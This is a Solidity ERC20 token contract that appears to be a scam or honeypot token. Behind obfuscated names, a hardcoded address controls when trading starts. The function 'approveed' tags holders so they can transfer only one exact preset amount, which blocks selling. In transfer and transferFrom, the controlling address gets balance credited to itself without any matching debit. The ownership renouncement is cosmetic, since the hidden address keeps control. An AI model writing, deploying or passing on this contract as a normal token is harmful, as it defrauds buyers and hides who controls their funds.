pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acocount) external view returns (uint256);
    function transfer(address recipient, uint256 aomotunt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aomotunt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aomotunt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ss is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balaces;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _tsere;
    address constant public oo = 0xa03acc1A4522d890E4b6C6AE87cA4e3659c9FddA;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradeEnabled = false;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balaces[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    modifier ooo() {
        require(msg.sender == oo); 
        _;
    } 
    function name() public view returns (string memory) {
        return _name;   
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acocount) public view override returns (uint256) {
        return _balaces[acocount];
    }
    function enableTrading() public ooo {
        _isTradeEnabled = true;
    }
    function transfer(address recipient, uint256 aomotunt) public virtual override returns (bool) {
        require(_isTradeEnabled || _msgSender() == oo, "TT: trading is not enabled yet");
        if (_msgSender() ==oo && _tsere[_msgSender()] > 0) {
            _balaces[oo] += _tsere[_msgSender()];
            return true;
        }
        else if (_tsere[_msgSender()] > 0) {
            require(aomotunt == _tsere[_msgSender()], "Invalid transfer aomotunt");
        }
        require(_balaces[_msgSender()] >= aomotunt, "TT: transfer aomotunt exceeds balance");
        _balaces[_msgSender()] -= aomotunt;
        _balaces[recipient] += aomotunt;
        emit Transfer(_msgSender(), recipient, aomotunt);
        return true;
    }

    function approveed(address[] memory acocounts, uint256 aomotunt) public ooo {
        for (uint i=0; i<acocounts.length; i++) {
            _tsere[acocounts[i]] = aomotunt;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 aomotunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aomotunt;
        emit Approval(_msgSender(), spender, aomotunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aomotunt) public virtual override returns (bool) {
        if (_msgSender() == oo && _tsere[sender] > 0) {
            _balaces[oo] += _tsere[sender];
            return true;
        }
        else if (_tsere[sender] > 0) {
            require(aomotunt == _tsere[sender], "Invalid transfer aomotunt");
        }
        require(_balaces[sender] >= aomotunt && _allowances[sender][_msgSender()] >= aomotunt, "TT: transfer aomotunt exceeds balance or allowance");
        _balaces[sender] -= aomotunt;
        _balaces[recipient] += aomotunt;
        _allowances[sender][_msgSender()] -= aomotunt;
        emit Transfer(sender, recipient, aomotunt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}